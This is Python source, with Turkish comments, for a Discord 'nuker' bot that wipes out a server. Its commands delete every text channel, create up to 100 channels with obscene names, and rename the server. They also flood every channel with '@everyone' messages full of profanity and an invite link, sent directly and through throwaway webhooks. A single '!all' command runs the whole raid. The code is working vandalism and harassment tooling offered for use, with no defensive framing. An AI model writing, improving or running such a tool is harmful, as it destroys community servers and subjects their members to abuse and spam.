import discord
from discord.ext import commands
import asyncio
import sys
import random
import io
from PIL import Image
import time
import os
# Tüm varsayılan niyetleri etkinleştirin
intents = discord.Intents.default()
intents.members = True  # Üye olaylarını dinlemek için
intents.message_content = True  # Mesaj içeriğini okumak için

# Botu oluştur
bot = commands.Bot(command_prefix="!", intents=intents)

# Kanal spam
@bot.command()
async def kspam(ctx, count: int = 100):
    tasks = []
    for _ in range(count):
        try:
            # asyncio.create_task ile görevi oluştur
            task = asyncio.create_task(ctx.guild.create_text_channel(name=f"💥💥💥💥💥-HACKER-SEKS-AH-ORUSPU"))
            tasks.append(task)
        except discord.HTTPException as e:
            print(f"Kanal oluşturma hatası: {e}")

    try:
        # Toplu olarak kanallar oluştur
        await asyncio.gather(*tasks)
        await ctx.send(f"{count} kanal oluşturuldu.")
    except Exception as e:
        print(f"Toplu işlem hatası: {e}")

@bot.command()
async def delete(ctx):
    try:
        text_channels = [ch for ch in ctx.guild.channels if isinstance(ch, discord.TextChannel)]
        for i in range(0, len(text_channels), 5):
            for channel in text_channels[i:i+5]:
                try:
                    await channel.delete()
                except:
                    pass  # Hata olursa geç
            await asyncio.sleep(3)
    except:
        pass  # Hata olursa sessizce geç

@bot.command()
async def everspam12(ctx, mesaj: str = "@everyone amk çocugu ananı sikim ben senın"):
    # Tüm kanalları bir listeye kaydet
    kanallar = [channel for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]

    while True:
        tasks = []
        for kanal in kanallar:
            tasks.append(kanal.send(mesaj))

        try:
            # Toplu olarak mesajları gönder
            await asyncio.gather(*tasks)
        except Exception as e:
            print(f"Toplu işlem hatası: {e}")

        # 1 saniye bekle
        await asyncio.sleep(5)
@bot.command()
async def spam123(ctx):
    try:
        # Tüm kanalları bir listeye kaydet
        kanallar = [channel for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]

        # Her kanala webhook oluştur
        webhooklar = []
        for _ in range(len(kanallar)): # Tüm kanallar için döngü
            try:
                # Rastgele bir kanal seç
                kanal = random.choice(kanallar)
                webhook = await kanal.create_webhook(name="İLK CLASS İLK SIRASI")
                webhooklar.append(webhook)

                # Toplu mesaj gönderme (örneğin, 10 mesaj bir seferde)
                for i in range(5):
                    tasks = [webhook.send("💥 @everyone  https://discord.gg/qww7hTPe 💥") for _ in range(i, min(i+10, 20))]
                    await asyncio.gather(*tasks)
                    await asyncio.sleep(0.5) # API'yi aşırı yüklememek için kısa bir gecikme

                # Webhook'u sil
                await webhook.delete()

                # Yeni webhook oluştur
                webhook = await kanal.create_webhook(name="CLASS BOTS SEKS BOM!")

            except discord.HTTPException as e:
                print(f"Webhook oluşturma veya silme hatası: {e}")

        await ctx.send("İşlem tamamlandı.")

    except discord.HTTPException as e:
        await ctx.send(f"İşlem sırasında hata oluştu: {e}")

@bot.command()
async def spam12(ctx):
    try:
        # Tüm kanalları bir listeye kaydet
        kanallar = [channel for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]

        # Her kanala webhook oluştur
        webhooklar = []
        for _ in range(len(kanallar)): # Tüm kanallar için döngü
            try:
                # Rastgele bir kanal seç
                kanal = random.choice(kanallar)
                webhook = await kanal.create_webhook(name="İLK CLASS İLK SIRASI")
                webhooklar.append(webhook)

                # Toplu mesaj gönderme (örneğin, 10 mesaj bir seferde)
                for i in range(5):
                    tasks = [webhook.send("💥 @everyone  https://discord.gg/qww7hTPe 💥") for _ in range(i, min(i+10, 20))]
                    await asyncio.gather(*tasks)
                    await asyncio.sleep(0.5) # API'yi aşırı yüklememek için kısa bir gecikme

                # Webhook'u sil
                await webhook.delete()

                # Yeni webhook oluştur
                webhook = await kanal.create_webhook(name="CLASS BOTS SEKS BOM!")

            except discord.HTTPException as e:
                print(f"Webhook oluşturma veya silme hatası: {e}")

        await ctx.send("İşlem tamamlandı.")

    except discord.HTTPException as e:
        await ctx.send(f"İşlem sırasında hata oluştu: {e}")

# Sunucu adını değiştir
@bot.command()
async def servername(ctx):
    try:
        await ctx.guild.edit(name="!CLASS BOTU!")
    except discord.HTTPException as e:
        await ctx.send(f"Sunucu adını değiştirmede hata: {e}")


# Spam tetikleyicisi
@bot.command()
async def spam(ctx):
    try:
        await asyncio.gather(
            everspam12(ctx),
            spam123(ctx),
            spam12(ctx),
        )
        await ctx.send("İşlem tamamlandı.")
    except discord.HTTPException as e:
        await ctx.send(f"İşlem sırasında hata oluştu: {e}")

# Sunucu adı ve fotoğrafını değiştirme
@bot.command()
async def server(ctx):
    try:
        await servername(ctx)
        await ctx.send("İşlem tamamlandı.")
    except discord.HTTPException as e:
        await ctx.send(f"İşlem sırasında hata oluştu: {e}")

# "ALL" komutu
@bot.command()
async def all(ctx):
    try:
        await server(ctx)
        await delete(ctx)
        await kspam(ctx)
        await spam(ctx)
        await ctx.send("İşlem tamamlandı.")
    except discord.HTTPException as e:
        await ctx.send(f"İşlem sırasında hata oluştu: {e}")

# Botun yardımı
@bot.command()
async def a(ctx):
    await ctx.author.send("Kullanılabilir komutlar:Uyarı Benim Yetkim Tam Olması Lazım\n"
                           "- `!all Tüm Özeliki Kullanır]`\n"
                           "- `!kspam [250 Kanal Yapa]`\n"
                           "- `!delete [Tüm Kanal Sile Text]`\n"
                           "- `!spam [Webhook Ve Bot He Kanala Spam Yapa]`\n"
                           "- `!server Sunucu Adı Değişir`")

@bot.event
async def on_ready():
    print(f"✅ Bot aktif: {bot.user}")

def start_bot(token):
    bot.run(token)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Token parametresi eksik.")
        sys.exit(1)

    token = sys.argv[1]
    start_bot(token)